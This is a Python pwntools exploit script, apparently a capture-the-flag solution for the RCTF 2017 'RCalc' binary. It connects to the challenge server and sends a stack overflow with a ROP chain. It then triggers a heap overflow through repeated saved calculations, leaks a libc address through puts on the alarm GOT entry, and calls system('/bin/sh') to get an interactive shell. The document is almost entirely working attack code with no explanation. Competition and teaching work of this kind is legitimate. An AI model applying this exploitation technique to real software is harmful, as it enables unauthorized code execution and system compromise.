# RCTF_2017
from pwn import *
import time

os.environ['LD_PRELOAD'] = './libc.so.6'
e = ELF('./RCalc')
libc = ELF('./libc.so.6')
local = 0

prdi = 0x0000000000401123
leave = 0x0000000000400f9f
buf = 0x0000000000602200
gadget1 = 0x0000000000401100# : mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12 + rbx*8]
gadget2 = 0x000000000040111a# : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

if local:
    r = process('./RCalc')
else:
    r = remote('rcalc.2017.teamrois.cn', 2333)

def packAll(rop):
    return flat([p64(x) for x in rop])

rop = []
rop += [gadget2, 0x40, 0x41, 0x0000000000601e50, 0x100, buf, 0]
rop += [gadget1]
rop += [0, 0, buf, 0, 0, 0, 0]
rop += [leave]
rop = packAll(rop)

r.sendlineafter('Input your name pls: ', (0x108)*'A'+'\x00'*0x8+0x8*'A'+rop)

# heap overflow
for i in range(35):
    print i
    r.sendlineafter('Your choice:', '1')
    r.sendlineafter('input 2 integer: ', '0')
    r.sendline('0')
    r.sendlineafter('Save the result?', 'yes')
    r.recv(100)
raw_input('>>')
r.sendlineafter('Your choice:', '5')
rop = [0]# pop rbp

rop += [prdi, e.got['alarm']]
rop += [e.plt['puts']] # leak libc address

rop += [gadget2, 0x40, 0x41, 0x0000000000601e50, 0x100, buf+0x100, 0]
rop += [gadget1]
rop += [0, 0, buf+0x100, 0, 0, 0, 0]
rop += [leave]

r.send(packAll(rop))
time.sleep(0.5)
alarm = u64(r.recv(100)[0:6]+'\x00\x00')
base = alarm - libc.symbols['alarm']
binsh = base + next(libc.search('/bin/sh'))
system = base + libc.symbols['system']
print hex(base)

rop = [0]
rop += [prdi, binsh]
rop += [system]
r.send(packAll(rop))
r.interactive()
